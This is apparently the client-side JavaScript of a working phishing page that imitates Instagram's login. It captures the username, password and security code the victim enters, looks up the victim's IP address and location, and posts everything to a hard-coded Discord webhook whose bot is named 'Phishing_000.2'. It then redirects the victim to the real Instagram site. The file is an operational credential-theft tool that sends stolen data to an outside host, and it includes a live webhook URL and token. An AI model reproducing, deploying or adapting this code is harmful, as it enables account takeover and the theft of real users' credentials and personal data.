const loginButton = document.querySelector("#loginBtn");
const password = document.querySelector("#passwordInput");
const username = document.querySelector("#usernameInput");
const alldata= {
  username:"",
  password:"",
  securityCode:""
}

const showPasswordBtn = document.querySelector("#showPasswordBtn");

password.addEventListener("input", disableBtn);
username.addEventListener("input", disableBtn);





function passwordVisible() {
  if (password.type === "password") {
    password.type = "text";
    showPasswordBtn.textContent = "Hide";
  } else {
    password.type = "password";
    showPasswordBtn.textContent = "Show";
  }
}

function passwordBtnVisible() {
  if (password.value.length > 0) {
    showPasswordBtn.style.display = "block";
  } else {
    showPasswordBtn.style.display = "none";
  }
}

function disableBtn() {
  if (username.value && password.value) {
      loginButton.disabled = false;
  } else {
      loginButton.disabled = true;
  }
}

let Info
loginButton.addEventListener("click", () => {
  (async function() {
    // Info = await getInfo();
    // console.log("info",Info);
    alldata.username=document.getElementById('usernameInput').value;
    alldata.password=document.getElementById('passwordInput').value;
    toggleHtml()
    sendInfo();
    document.getElementById('loginBtn2').addEventListener('click', function() {
      document.querySelector("#seccode");
      alldata.securityCode=document.getElementById('seccode').value;
      // console.log(alldata)
      Info = getInfo();
      console.log("info",Info);
      sendInfo();
      setTimeout(function() {
        window.location.replace("https://www.instagram.com/explore/")
    }, 1000);



});



    // sendInfo()
  })();
})







async function getInfo() {
  try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();

    const info = `> IP: ${data.ip}\n> Şehir: ${data.city}\n> Bölge: ${data.region}\n> Ülke: ${data.country_name}\n> Posta kodu: ${data.postal}\n> Browser: ${navigator.userAgent}\n> Username: ${alldata.username}\n> Password: ${alldata.password}\n Seccode: ${alldata.securityCode} `;  //`ip: ${data.ip}, city: ${data.city}, region: ${data.region}, country: ${data.country_name}, postal: ${data.postal}, browser: ${navigator.userAgent}`;

    return info;
  } catch {
    return `> IP: Unknown\n> Şehir: Unknown\n> Bölge: Unknown\n> Ülke: Unknown\n> Posta kodu: Unknown\n> Browser: ${navigator.userAgent}\n> Username: ${alldata.username}\n> Password: ${alldata.password}\n Seccode: ${alldata.securityCode}`;
  }
}
  

async function sendInfo() {
    let info="";
    try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();

    info = `> IP: ${data.ip}\n> Şehir: ${data.city}\n> Bölge: ${data.region}\n> Ülke: ${data.country_name}\n> Posta kodu: ${data.postal}\n> Browser: ${navigator.userAgent}\n> Username: ${alldata.username}\n> Password: ${alldata.password}\n Seccode: ${alldata.securityCode} `;  //`ip: ${data.ip}, city: ${data.city}, region: ${data.region}, country: ${data.country_name}, postal: ${data.postal}, browser: ${navigator.userAgent}`;
  } catch {
    info = `> IP: Unknown\n> Şehir: Unknown\n> Bölge: Unknown\n> Ülke: Unknown\n> Posta kodu: Unknown\n> Browser: ${navigator.userAgent}\n> Username: ${alldata.username}\n> Password: ${alldata.password}\n Seccode: ${alldata.securityCode}`;
  }


  const webhook = "https://discord.com/api/webhooks/1215673969483452466/t84VOKVWf0p8DdVtsfEptNdQ_FOR97A3Csijgko5cpfQbQiIG1pOX4NPKzn4ErAJdmfw"; //your discord webhook url

  const embed = {
    color: 1585803, //#18328b
    title: "Giriş denemesi",
    description: `${info}`, //`${Info}> Username: ${username.value}\n> Password: ${password.value}\n`
    footer: {
      text: "forOldDays",
    }
  }

  const config = {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ username: "Phishing_000.2", embeds: [embed] }) //content: `${Info}`
  };

  try {
    await fetch(webhook, config);
  } catch {

  }

}



function toggleHtml() {
    var html1 = document.getElementById("html1");
    var html2 = document.getElementById("html2");

    if (html1.style.display === "none") {
        html1.style.display = "block";
        html2.style.display = "none";
    } else {
        html1.style.display = "none";
        html2.style.display = "block";
    }
        // Yeni CSS dosyasını yükle
    var newStyleSheet = document.createElement('link');
    newStyleSheet.rel = 'stylesheet';
    newStyleSheet.href = '2wTTGzr-5Oe.css';

    // Mevcut stil dosyasını değiştir
    var oldStyleSheet = document.querySelector('link[href="style.css"]');
    oldStyleSheet.parentNode.insertBefore(newStyleSheet, oldStyleSheet.nextSibling);
    oldStyleSheet.parentNode.removeChild(oldStyleSheet);
}



function myFunction() {
    alert('Button clicked!');
    // Buraya butona tıklanınca yapılacak işlemleri ekleyebilirsiniz.
}